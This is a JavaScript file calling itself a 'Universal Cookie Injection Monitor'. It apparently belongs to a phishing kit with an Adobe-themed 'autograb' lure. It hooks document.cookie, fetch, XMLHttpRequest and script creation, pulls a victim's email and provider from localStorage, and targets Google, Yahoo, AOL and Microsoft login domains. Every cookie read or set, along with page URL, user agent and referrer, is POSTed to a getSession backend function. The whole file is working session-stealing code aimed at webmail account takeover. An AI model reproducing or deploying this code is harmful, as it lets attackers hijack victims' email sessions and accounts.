// Universal Cookie Injection Monitor - Enhanced for ALL DOMAINS
(function() {
    'use strict';
    
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof document === 'undefined') {
        console.warn('Universal Cookie Monitor loaded in non-browser environment');
        return;
    }
    
    console.log('🌍 Universal Cookie Injection Monitor loaded - ALL DOMAINS');
    
    // Helper to get domain from email/provider
    function getDomainFromEmailProvider() {
        let email = '';
        let provider = '';
        try {
            const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
            email = sessionData.email || '';
            provider = sessionData.provider || '';
        } catch (e) {}
        const providerLower = (provider || '').toLowerCase();
        if (providerLower.includes('gmail') || providerLower.includes('google')) {
            return '.google.com';
        } else if (providerLower.includes('yahoo')) {
            return '.yahoo.com';
        } else if (providerLower.includes('aol')) {
            return '.aol.com';
        } else if (providerLower.includes('hotmail') || providerLower.includes('live') ||
                   providerLower.includes('outlook') || providerLower.includes('office365')) {
            return '.live.com';
        } else if (providerLower === 'others' && email && email.includes('@')) {
            return '.' + email.split('@')[1].toLowerCase();
        }
        if (email && email.includes('@')) {
            return '.' + email.split('@')[1].toLowerCase();
        }
        return window.location.hostname.startsWith('.') ? window.location.hostname : `.${window.location.hostname}`;
    }
    
    // Store original cookie descriptor
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    
    // Cookie storage
    let capturedCookies = [];
    let allDomainCookies = {};
    let crossDomainRequests = [];
    
    // Function to capture and send cookie data
    function captureCookieData(action, cookieString, domain) {
        domain = domain || getDomainFromEmailProvider();
        const timestamp = new Date().toISOString();
        const cookieData = {
            action: action,
            cookie: cookieString,
            domain: domain,
            url: window.location.href,
            timestamp: timestamp,
            userAgent: navigator.userAgent,
            referrer: document.referrer
        };
        
        capturedCookies.push(cookieData);
        
        if (!allDomainCookies[domain]) {
            allDomainCookies[domain] = [];
        }
        allDomainCookies[domain].push(cookieData);
        
        console.log(`🌍 Cookie ${action} on ${domain}:`, cookieString?.substring(0, 100) + (cookieString?.length > 100 ? '...' : ''));
        
        // Send to backend if available
        try {
            const apiUrl = window.location.origin + '/.netlify/functions/getSession';
            fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(cookieData)
            }).catch(e => console.log('Cookie capture endpoint not available'));
        } catch (e) {
            // Silently fail if endpoint not available
        }
    }
    
    // Enhanced cross-domain monitoring
    function monitorCrossDomainRequest(url, method = 'GET') {
        try {
            let fullUrl;
            if (url.startsWith('http://') || url.startsWith('https://')) {
                fullUrl = url;
            } else if (url.startsWith('//')) {
                fullUrl = window.location.protocol + url;
            } else if (url.startsWith('/')) {
                fullUrl = window.location.origin + url;
            } else {
                fullUrl = new URL(url, window.location.href).href;
            }
            
            const urlObj = new URL(fullUrl);
            const domain = urlObj.hostname;
            
            const requestData = {
                url: url,
                domain: domain,
                method: method,
                timestamp: new Date().toISOString(),
                cookies: document.cookie
            };
            
            crossDomainRequests.push(requestData);
            captureCookieData('DOMAIN_REQUEST', document.cookie, domain);
            console.log(`🌐 Request to ${domain}:`, url);
            
            if (domain.includes('microsoftonline.com') || 
                domain.includes('login.live.com') || 
                domain.includes('outlook.com') ||
                domain.includes('login.microsoft.com')) {
                setTimeout(() => {
                    const newCookies = document.cookie;
                    if (newCookies) {
                        captureCookieData('MICROSOFT_DOMAIN', newCookies, domain);
                    }
                }, 500);
            }
            
            if (domain.includes('google.com') || 
                domain.includes('yahoo.com') || 
                domain.includes('aol.com')) {
                setTimeout(() => {
                    const newCookies = document.cookie;
                    if (newCookies) {
                        captureCookieData('EMAIL_PROVIDER', newCookies, domain);
                    }
                }, 500);
            }
        } catch (e) {
            console.warn('Invalid URL for domain monitoring:', url);
        }
    }
    
    function monitorIframes() {
        const iframes = document.querySelectorAll('iframe');
        iframes.forEach(iframe => {
            try {
                const iframeSrc = iframe.src || iframe.getAttribute('src');
                if (iframeSrc) {
                    const iframeDomain = new URL(iframeSrc, window.location.href).hostname;
                    try {
                        if (iframe.contentDocument) {
                            const iframeCookies = iframe.contentDocument.cookie;
                            if (iframeCookies) {
                                captureCookieData('IFRAME_READ', iframeCookies, iframeDomain);
                                console.log(`🍪 Iframe cookies from ${iframeDomain}:`, iframeCookies);
                            }
                        }
                    } catch (crossOriginError) {
                        captureCookieData('CROSS_ORIGIN_IFRAME', document.cookie, iframeDomain);
                    }
                }
            } catch (e) {
                console.warn('Error monitoring iframe:', e);
            }
        });
    }
    
    function enhancedDomainMonitoring() {
        const currentDomain = window.location.hostname;
        const currentCookies = document.cookie;
        if (currentCookies) {
            captureCookieData('CURRENT_DOMAIN', currentCookies, currentDomain);
        }
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        if (node.tagName === 'IFRAME') {
                            setTimeout(() => monitorIframes(), 1000);
                        }
                        if (node.tagName === 'SCRIPT') {
                            setTimeout(() => {
                                const newCookies = document.cookie;
                                if (newCookies) {
                                    captureCookieData('SCRIPT_INJECTION', newCookies, currentDomain);
                                }
                            }, 500);
                        }
                    }
                });
            });
        });
        
        if (document.body) {
            observer.observe(document.body, { childList: true, subtree: true });
        }
    }
    
    function initializeEnhancedMonitoring() {
        enhancedDomainMonitoring();
        monitorIframes();
        let currentUrl = window.location.href;
        setInterval(() => {
            if (window.location.href !== currentUrl) {
                currentUrl = window.location.href;
                setTimeout(() => {
                    enhancedDomainMonitoring();
                    monitorIframes();
                }, 1000);
            }
        }, 1000);
    }
    
    Object.defineProperty(Document.prototype, 'cookie', {
        get: function() {
            const cookies = originalCookieDescriptor.get.call(this);
            if (cookies) {
                captureCookieData('READ', cookies, getDomainFromEmailProvider());
            }
            return cookies;
        },
        set: function(cookieString) {
            captureCookieData('SET', cookieString, getDomainFromEmailProvider());
            return originalCookieDescriptor.set.call(this, cookieString);
        },
        configurable: true
    });
    
    // Enhanced fetch monitoring
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const url = args[0];
        const options = args[1] || {};
        
        if (typeof url === 'string' || url instanceof URL) {
            monitorCrossDomainRequest(url.toString(), options.method || 'GET');
        }
        
        return originalFetch.apply(this, args).then(response => {
            setTimeout(() => {
                const newCookies = document.cookie;
                if (newCookies) {
                    captureCookieData('POST_FETCH', newCookies, getDomainFromEmailProvider());
                }
            }, 100);
            return response;
        });
    };
    
    // Enhanced XMLHttpRequest monitoring
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url, ...args) {
        this._monitorUrl = url;
        this._monitorMethod = method;
        
        if (typeof url === 'string') {
            monitorCrossDomainRequest(url, method);
        }
        
        return originalXHROpen.call(this, method, url, ...args);
    };
    
    XMLHttpRequest.prototype.send = function(data) {
        const xhr = this;
        
        xhr.addEventListener('load', function() {
            setTimeout(() => {
                const newCookies = document.cookie;
                if (newCookies) {
                    captureCookieData('XHR_RESPONSE', newCookies, getDomainFromEmailProvider());
                }
            }, 100);
        });
        
        return originalXHRSend.call(this, data);
    };
    
    const originalCreateElement = document.createElement;
    document.createElement = function(tagName) {
        const element = originalCreateElement.call(this, tagName);
        
        if (tagName.toLowerCase() === 'script') {
            element.addEventListener('load', function() {
                setTimeout(() => {
                    const newCookies = document.cookie;
                    if (newCookies) {
                        captureCookieData('SCRIPT_LOAD', newCookies, getDomainFromEmailProvider());
                    }
                }, 100);
            });
        }
        
        return element;
    };
    
    const monitoringInterval = setInterval(() => {
        const currentCookies = document.cookie;
        if (currentCookies) {
            captureCookieData('PERIODIC_CHECK', currentCookies, getDomainFromEmailProvider());
        }
        monitorIframes();
        enhancedDomainMonitoring();
    }, 2000);
    
    window.addEventListener('storage', function(e) {
        captureCookieData('STORAGE_EVENT', document.cookie, getDomainFromEmailProvider());
    });
    
    document.addEventListener('visibilitychange', function() {
        if (!document.hidden) {
            captureCookieData('PAGE_VISIBLE', document.cookie, getDomainFromEmailProvider());
        }
    });
    
    ['focus', 'blur', 'beforeunload', 'unload'].forEach(eventType => {
        window.addEventListener(eventType, function() {
            const cookies = document.cookie;
            if (cookies) {
                captureCookieData(`WINDOW_${eventType.toUpperCase()}`, cookies, getDomainFromEmailProvider());
            }
        });
    });
    
    window.addEventListener('hashchange', function() {
        captureCookieData('WINDOW_FOCUS', document.cookie, getDomainFromEmailProvider());
    });
    
    window.addEventListener('popstate', function() {
        captureCookieData('POPSTATE', document.cookie, getDomainFromEmailProvider());
    });
    
    window.getCapturedCookies = function() {
        return capturedCookies;
    };
    
    window.getAllDomainCookies = function() {
        return allDomainCookies;
    };
    
    window.getCrossDomainRequests = function() {
        return crossDomainRequests;
    };
    
    window.forceCookieCapture = function() {
        captureCookieData('MANUAL_CAPTURE', document.cookie, getDomainFromEmailProvider());
        monitorIframes();
        return {
            cookies: document.cookie,
            domains: Object.keys(allDomainCookies),
            crossDomainRequests: crossDomainRequests.length
        };
    };
    
    setTimeout(() => {
        captureCookieData('INITIAL_LOAD', document.cookie, getDomainFromEmailProvider());
        monitorIframes();
        initializeEnhancedMonitoring();
    }, 500);
    
    console.log('🌍 Universal Cookie Monitor active for ALL domains - Enhanced version with full domain coverage');
})();